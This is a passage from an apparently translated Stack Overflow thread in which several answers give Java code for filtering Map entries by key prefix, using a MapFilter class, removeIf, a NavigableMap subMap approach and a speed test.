            return entry.getKey();
        }

        @Override
        public T getValue() {
            // Remember that the value is the entry in the underlying map.
            return entry.getValue().getValue();
        }

        @Override
        public T setValue(T newValue) {
            // Remember that the value is the entry in the underlying map.
            return entry.getValue().setValue(newValue);
        }

        @Override
        public boolean equals(Object o) {
            if (!(o instanceof Entry)) {
                return false;
            }
            Entry e = (Entry) o;
            return getKey().equals(e.getKey()) && getValue().equals(e.getValue());
        }

        @Override
        public int hashCode() {
            return getKey().hashCode() ^ getValue().hashCode();
        }

        @Override
        public String toString() {
            return getKey() + "=" + getValue();
        }

        @Override
        public int compareTo(Entry<T> o) {
            return getKey().compareTo(o.getKey());
        }

    }

    // Simple tests.
    public static void main(String[] args) {
        String[] samples = {
                "Some.For.Me",
                "Some.For.You",
                "Some.More",
                "Yet.More"};
        Map map = new HashMap();
        for (String s : samples) {
            map.put(s, s);
        }
        Map all = new MapFilter(map);
        Map some = new MapFilter(map, "Some.");
        Map someFor = new MapFilter(some, "For.");
        System.out.println("All: " + all);
        System.out.println("Some: " + some);
        System.out.println("Some.For: " + someFor);

        Properties props = new Properties();
        props.setProperty("namespace.prop1", "value1");
        props.setProperty("namespace.prop2", "value2");
        props.setProperty("namespace.iDontKnowThisNameAtCompileTime", "anothervalue");
        props.setProperty("someStuff.morestuff", "stuff");
        Map<String, String> filtered = new MapFilter(props, "namespace.");
        System.out.println("namespace props " + filtered);
    }

} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-05-29T19:24:34.093

删除所有不以所需前缀开头的键：

```
yourMap.keySet().removeIf(key -> !key.startsWith(keyPrefix)); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2021-01-21T11:01:05.700

接受的答案在 99% 的情况下都有效，但问题在于细节。

`Character.MAX_VALUE`具体来说，当地图有一个以前缀开头，后跟其他任何内容的键时，接受的答案不起作用。对已接受答案发表的评论会产生一些小的改进，但仍不能涵盖所有情况。

以下解决方案还使用[NavigableMap](https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/util/NavigableMap.html)来挑选给定键前缀的子地图。解决方案是`subMapFrom()`方法，诀窍是不要增加/增加前缀的最后一个字符，而是`MAX_VALUE`在切断所有尾随`MAX_VALUE`s 的同时不增加最后一个字符。例如，如果前缀是“abc”，我们将其递增为“abd”。但是，如果前缀是“ab”+ `MAX_VALUE`，我们会删除最后一个字符并替换前一个字符，从而产生“ac”。

```
import static java.lang.Character.MAX_VALUE;

public class App
{
    public static void main(String[] args) {
        NavigableMap<String, String> map = new TreeMap<>();

        String[] keys = {
                "a",
                "b",
                "b" + MAX_VALUE,
                "b" + MAX_VALUE + "any",
                "c"
        };

        // Populate map
        Stream.of(keys).forEach(k -> map.put(k, ""));

        // For each key that starts with 'b', find the sub map
        Stream.of(keys).filter(s -> s.startsWith("b")).forEach(p -> {
            System.out.println("Looking for sub map using prefix \"" + p + "\".");

            // Always returns expected sub maps with no misses
            // [b, b, bany], [b, bany] and [bany]
            System.out.println("My solution: " +
                    subMapFrom(map, p).keySet());

            // WRONG! Prefix "b" misses "bany"
            System.out.println("SO answer:   " +
                    map.subMap(p, true, p + MAX_VALUE, true).keySet());

            // WRONG! Prefix "b" misses "b" and "bany"
            System.out.println("SO comment:  " +
                    map.subMap(p, true, tryIncrementLastChar(p), false).keySet());

            System.out.println();
        });
    }

    private static <V> NavigableMap<String, V> subMapFrom(
            NavigableMap<String, V> map, String keyPrefix)
    {
        final String fromKey = keyPrefix, toKey; // undefined

        // Alias
        String p = keyPrefix;

        if (p.isEmpty()) {
            // No need for a sub map
            return map;
        }

        // ("ab" + MAX_VALUE + MAX_VALUE + ...) returns index 1
        final int i = lastIndexOfNonMaxChar(p);

        if (i == -1) {
            // Prefix is all MAX_VALUE through and through, so grab rest of map
            return map.tailMap(p, true);
        }

        if (i < p.length() - 1) {
            // Target char for bumping is not last char; cut out the residue
            // ("ab" + MAX_VALUE + MAX_VALUE + ...) becomes "ab"
            p = p.substring(0, i + 1);
        }
        toKey = bumpChar(p, i);

        return map.subMap(fromKey, true, toKey, false);
    }

    private static int lastIndexOfNonMaxChar(String str) {
        int i = str.length();

        // Walk backwards, while we have a valid index
        while (--i >= 0) {
            if (str.charAt(i) < MAX_VALUE) {
                return i;
            }
        }

        return -1;
    }

    private static String bumpChar(String str, int pos) {
        assert !str.isEmpty();
        assert pos >= 0 && pos < str.length();

        final char c = str.charAt(pos);
        assert c < MAX_VALUE;

        StringBuilder b = new StringBuilder(str);
        b.setCharAt(pos, (char) (c + 1));
        return b.toString();
    }

    private static String tryIncrementLastChar(String p) {
        char l = p.charAt(p.length() - 1);
        return l == MAX_VALUE ?
                // Last character already max, do nothing
                p :
                // Bump last character
                p.substring(0, p.length() - 1) + ++l;
    }
} 
```

输出：

```
Looking for sub map using prefix "b".
My solution: [b, b, bany]
SO answer:   [b, b]
SO comment:  [b, b, bany]

Looking for sub map using prefix "b".
My solution: [b, bany]
SO answer:   [b, bany]
SO comment:  []

Looking for sub map using prefix "bany".
My solution: [bany]
SO answer:   [bany]
SO comment:  [bany] 
```

也许应该补充一点，我还尝试了各种其他方法，包括我在互联网上其他地方找到的代码。所有这些都因产生不正确的结果而失败，或者因各种异常而直接崩溃。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-23T14:29:30.360

map 的键集没有特殊的结构，所以我认为无论如何你都必须检查每个键。所以你找不到比单循环更快的方法......

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-25T20:05:10.453

我使用此代码进行了速度试验：

```
public class KeyFinder {

    private static Random random = new Random();

    private interface Receiver {
        void receive(String value);
    }

    public static void main(String[] args) {
        for (int trials = 0; trials < 10; trials++) {
            doTrial();
        }
    }

    private static void doTrial() {

        final Map<String, String> map = new HashMap<String, String>();
        giveRandomElements(new Receiver() {
            public void receive(String value) {
                map.put(value, null);
            }
        }, 10000);

        final Set<String> expressions = new HashSet<String>();
        giveRandomElements(new Receiver() {
            public void receive(String value) {
                expressions.add(value);
            }
        }, 1000);

        int hits = 0;
        long start = System.currentTimeMillis();
        for (String expression : expressions) {
            for (String key : map.keySet()) {
                if (key.startsWith(expression)) {
                    hits++;
                }
            }
        }
        long stop = System.currentTimeMillis();
        System.out.printf("Found %s hits in %s ms\n", hits, stop - start);
    }

    private static void giveRandomElements(Receiver receiver, int count) {
        for (int i = 0; i < count; i++) {
            String value = String.valueOf(random.nextLong());
            receiver.receive(value);
        }

    }
} 
```

输出是：

```
Found 0 hits in 1649 ms
Found 0 hits in 1626 ms
Found 0 hits in 1389 ms
Found 0 hits in 1396 ms
Found 0 hits in 1417 ms
Found 0 hits in 1388 ms
Found 0 hits in 1377 ms
Found 0 hits in 1395 ms
Found 0 hits in 1399 ms
Found 0 hits in 1357 ms 
```

这计算 10000 个随机键中有多少以 1000 个随机字符串值中的任何一个开始（10M 检查）。

所以在一台简单的双核笔记本电脑上大约需要 1.4 秒；这对你来说太慢了吗？